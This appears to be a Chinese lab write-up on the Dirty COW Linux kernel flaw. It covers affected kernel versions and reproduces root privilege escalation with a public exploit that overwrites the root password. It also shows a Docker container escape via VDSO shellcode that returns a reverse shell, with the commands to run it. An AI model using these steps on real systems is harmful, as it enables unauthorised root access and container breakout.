



### 漏洞介绍
CVE-2016-5195
内存竞争导致能提权


### 影响版本
脏牛的影响范围很大，几乎涵盖了主流的Linux发行版。要判断系统是否受影响，有两个办法。

方法1：直接检查内核版本。

最简单的办法就是检查内核版本，看看内核是不是打过补丁的版本。Debian运行命令uname -v，Ubuntu/Centos/RHEL运行命令uname -r，不同发行版输出值不一样，以Debian 8为例，最新的安全内核输出如下：
```
~ uname -v
uname -v
#1 SMP Debian 3.16.36-1+deb8u2 (2016-10-19)
```
以下是主流发行版修复之后的内核版本，如果你的内核版本低于列表里的版本，表示还存在脏牛漏洞
```
Centos7 /RHEL7    3.10.0-327.36.3.el7
Cetnos6/RHEL6     2.6.32-642.6.2.el6
Ubuntu 16.10         4.8.0-26.28
Ubuntu 16.04         4.4.0-45.66
Ubuntu 14.04         3.13.0-100.147
Debian 8                3.16.36-1+deb8u2
Debian 7                3.2.82-1
```
### 环境搭建

本地虚拟机的ubuntu环境内核版本比较高，尝试使用exp提权失败，然后去下载低版本内核的ubuntu的服务器，http://old-releases.ubuntu.com/releases/14.04.3/ubuntu-14.04.1-server-amd64.iso，然后在本地搭建服务

### 漏洞复现

下载exp
https://github.com/gbonacini/CVE-2016-5195
./dcow

havaFun
如果能用直接提权，root用户更改密码

适用版本
```
The program was successfully used with:

- RHEL7 Linux  x86_64;
- RHEL4 (4.4.7-16, with "legacy" version) 
- Debian 7 ("wheezy");
- Ubuntu 14.04.1 LTS  
- Ubuntu 14.04.5 LTS
- Ubuntu 16.04.1 LTS
- Ubuntu 16.10
- Linux Mint 17.2

and compiled with: 

- clang version 4.0.0;
- gcc version 6.2.0 20161005 (Ubuntu 6.2.0-5ubuntu12) 
- gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.1) 
- gcc version 4.8.5 20150623 (Red Hat 4.8.5-4) (GCC);
- gcc version 4.8.4 (Ubuntu 4.8.4);
- gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1)
- gcc version 4.7.2 (Debian 4.7.2-5);
- gcc version 4.4.7 (with "legacy" version) 
```
### 测试环境
ubuntu16 4.8.0-22
拥有user用户，能执行./dcow
执行之后更改了root用户的口零，dirtyCowFun
直接用口令登录root用户

### 修复建议

升级内核




## 利用脏牛docker 逃逸 



我认为利用的条件比较苛刻。

我们要了解Docker逃逸漏洞是如何被利用的，就首先要知道VDSO。

在Linux中，有一个功能：VDSO(virtual dvnamic shared object),这是一个小型共享库，能将内核自动映射到所有用户程序的地址空间。

什么是VDSO呢？

### VDSO

它是一个优化性能的功能。

我们举个例子：gettimeofday是一个获取当前时间的函数，它经常被用户的程序调用，如果一个程序需要知道当前的时间，程序就会频繁的轮询。为了减少资源开销，内核需要把它放在一个所有进程都能访问的内存位置，然后通过VDSO定义一个功能来共享这个对象，让进程来访问此信息。

通过这种方式，调用的时间和资源花销就大大的降低了，速度也就变得更快。

那么如何利用VDSO来实现Docker逃逸的？

首先POC利用Dirty Cow漏洞，将Payload写到VDSO中的一些闲置内存中，并改变函数的执行顺序，使得在执行正常函数之前调用这个Shellcode。

Shellcode初始化时会检测是否被root所调用，如果调用，则继续执行，如果没有调用则返回，并执行clock_gettime函数，接下来它会检测/tmp/.X文件的存在，如果存在，则这时已经是root权限了，然后它会打开一个反向的TCP链接，为Shellcode中填写的ip返回一个Shell。

漏洞就这样产生了。

首先宿主机的内核版本符合脏牛利用的漏洞
下载docker镜像，已经包含了exp的文件
```
docker search dirtycow
下载the13的镜像，里面包含了exp
```
运行docker镜像

```
修改tag
sudo docker tag the13/dirtycow-docker-vdso dirtycow
运行镜像到容器
sudo docker run --name=test p 1234:1234 -itd dirtycow /bin/bash
```
进入容器执行exp
```
sudo docker exec -it test /bin/bash
cd /directory
make # 编译
ifconfig # 查看IP地址
./0x 127.0.0.1:1234 # 逃逸
```

![20201202095327](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201202095327.png)

exp执行失败
![20201202095356](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201202095356.png)


注意：
我试了好多次，利用是否成功要看运气。利用成功之后之后就不能再次执行exp了。要找到宿主机的ip，exp攻击地址默认是127.0.0.1:1234。
注意，这里并不是每次都能成功的，失败之后vdso_patch数组也会被填充，payload的内存地址数据不 为0，无法再次复现。失败输出：


成功的例子：
执行命令，查看当前用，创建文件，查找flag



### 参考连接
https://www.ichunqiu.com/experiment/detail?id=100297&source=2
https://www.cnblogs.com/xiaozi/p/13374514.html
https://www.freebuf.com/articles/container/242763.html
https://xz.aliyun.com/t/6167